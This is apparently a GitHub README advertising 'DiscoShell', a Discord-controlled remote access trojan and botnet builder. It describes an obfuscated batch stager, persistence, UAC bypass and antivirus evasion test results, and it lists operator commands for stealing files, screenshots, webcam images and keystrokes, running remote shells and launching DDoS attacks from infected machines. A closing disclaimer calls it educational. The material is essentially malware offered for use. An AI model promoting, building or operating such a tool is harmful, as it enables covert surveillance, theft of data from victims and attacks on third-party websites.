# DiscoShell

DiscoShell (a.k.a. DiscoSh) is a minimal remote access trojan that is controlled via a Discord bot, allowing the creation of a Discord-based botnet.

The builder generates a batch file stager which can be optionally obfuscated with [BatchGuard](https://github.com/cchash/BatchGuard) modules. The generated file can be used on its own and does not require additional code to be wrapped over it. You can find the compiled builder [here](https://github.com/cchash/DiscoShell/releases).

![image](https://media.discordapp.net/attachments/959762900443070485/960033794327461928/unknown.png)
![image](https://media.discordapp.net/attachments/959762900443070485/965810427609120778/unknown.png)

## Detection status
Virustotal result:
![image](https://media.discordapp.net/attachments/959762900443070485/960034118375190608/unknown.png)
[Link](https://www.virustotal.com/gui/file/541a70073404f35f6c0500d68de377d01dea3571f241723bb5975720c39dead8)

Also tested on a VM against Windows Defender, Avast and AVG.

None of the above guarantee that it is fully undetectable.

## Features
- Persistence
- UAC bypass
- Fileless

\+ Can perform all things described in the [Discord bot commands](#discord-bot-commands) section.

## Discord bot commands
The following commands are used to control infected machines.
```
get : Get username, machine name, IP address and IP location of all infected machines.
getsc {machine_name} : Get screenshot of specified machine.
getcam {machine_name} : Get snapshot from all video sources on specified machine.
getfile {machine_name} {file_path} : Upload file located in {file_path} on specified machine to Discord.
getav {machine_name} : Get all antivirus products installed on specified machine.

shell {machine_name} : Start remote shell on specified machine.
command {machine_name} {command} : Execute command on specified machine.

startkeylogger {machine_name} : Start keylogger on specified machine.
stopkeylogger {machine_name} : Stop keylogger on specified machine.
getkeylog {machine_name} : Get logged keys on specified machine.

startddos {website_url} : Make all infected machines send GET requests to specified URL.
stopddos : Make all infected machines stop sending GET requests.

uninfect {machine_name} : Uninfect specified machine.
```

## Disclaimer
This project was made for educational purposes and to test the capabilities of using Discord as a C2 server. If you choose to use this illegally/maliciously, it is your responsibility.
